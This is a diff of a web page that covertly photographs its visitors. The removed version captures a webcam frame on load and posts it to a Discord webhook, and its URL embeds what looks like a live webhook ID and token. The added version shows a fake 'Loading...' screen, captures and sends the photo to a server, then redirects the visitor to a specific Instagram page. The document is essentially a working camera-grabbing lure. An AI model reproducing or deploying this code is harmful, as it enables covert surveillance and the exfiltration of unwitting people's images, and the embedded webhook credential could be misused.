@@ -3,89 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Capture</title>
+    <title>Redirect After Photo Capture</title>
 </head>
 <body>
-
-    <h1>Capture Photo Automatically</h1>
-
-    <!-- Video element to show the webcam feed -->
-    <video id="webcam" width="320" height="240" autoplay></video>
-
-    <!-- Canvas element to hold the captured image -->
-    <canvas id="canvas" style="display: none;"></canvas>
+    <h1>Loading...</h1>
+    <p>Please wait while we process your request.</p>
 
     <script>
-        // Access user's webcam and display the video feed
-        async function setupWebcam() {
-            const video = document.getElementById('webcam');
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            video.srcObject = stream;
-
-            // Wait for the video to start playing, then capture the photo
-            video.onplaying = () => {
-                capturePhoto();  // Automatically capture the photo when the video starts
-            };
-        }
-
-        // Capture the photo automatically after the webcam feed starts
-        async function capturePhoto() {
-            const canvas = document.getElementById('canvas');
-            const video = document.getElementById('webcam');
-
-            // Set canvas size to match video
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-
-            // Draw the current frame from the video to the canvas
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            // Get Base64 encoded image data
-            const base64Image = canvas.toDataURL('image/png');
-            
-            // Send the image to Discord
-            sendToDiscord(base64Image);
-        }
-
-        // Function to send the captured image to Discord via Webhook
-        async function sendToDiscord(base64Image) {
-            const discordWebhookUrl = "https://discord.com/api/https://discord.com/api/webhooks/1331575190848667658/9Sz5ZCjFiAiGNlm6wZgA4MMDmbaMUb8tjZO-Wr7SWfXEWQ1GOH5d1Mgs5mJsX9t2Z43fwebhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";  // Replace with your actual Discord webhook URL
-
-            // Create a payload with the base64 image
-            const payload = {
-                content: "Photo from the user",
-                embeds: [
-                    {
-                        image: {
-                            url: base64Image  // The base64 image URL
-                        }
-                    }
-                ]
-            };
-
+        async function captureAndSendPhoto() {
             try {
-                // Send the image to Discord
-                const response = await fetch(discordWebhookUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                // Request camera access
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement("video");
+                video.srcObject = stream;
+                video.play();
+
+                // Wait for video to start playing
+                await new Promise(resolve => video.onplaying = resolve);
+
+                // Capture a frame from the video
+                const canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext("2d");
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Stop the video stream
+                stream.getTracks().forEach(track => track.stop());
+
+                // Convert the image to a data URL (Base64)
+                const imageData = canvas.toDataURL("image/png");
+
+                // Send the image to the server (you can replace the URL with your server)
+                const response = await fetch("http://localhost:3000/server.js", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ image: imageData })
                 });
 
                 if (response.ok) {
-                    alert("Photo sent to Discord!");
+                    // Redirect the user to the destination site
+                    window.location.href = "https://www.instagram.com/f_arsenova/tagged/";
                 } else {
-                    alert("Failed to send photo to Discord.");
+                    alert("Failed to send the photo.");
                 }
             } catch (error) {
-                console.error("Error sending to Discord:", error);
-                alert("Error sending photo to Discord.");
+                console.error("Error capturing or sending the photo:", error);
+                alert("An error occurred. Please try again.");
             }
         }
 
-        // Initialize webcam and automatically capture the photo
-        setupWebcam();
+        // Start the process when the page loads
+        window.onload = captureAndSendPhoto;
     </script>
-
 </body>
 </html>
